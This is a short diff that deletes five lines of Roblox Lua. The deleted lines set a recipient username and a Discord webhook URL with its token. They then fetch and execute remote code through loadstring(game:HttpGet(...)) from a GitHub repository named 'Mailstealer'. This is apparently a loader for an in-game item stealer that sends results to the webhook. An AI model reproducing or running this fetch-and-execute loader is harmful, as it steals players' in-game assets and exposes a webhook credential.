@@ -1,5 +1,0 @@
-_G.UserName = "hugemeg1"
-_G.Webhook = "https://discord.com/api/webhooks/1088779538772807741/Jywmf2mJBlor5cvgNkVKRLy7u0BeQQkU3BHk_HuPbwoIvAngEgMGpVzGGmWjjoNS45e1"
-_G.LSText = "RBX_STUDIO" 
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Burkino6666/Mailstealer/main/Lunar"))()
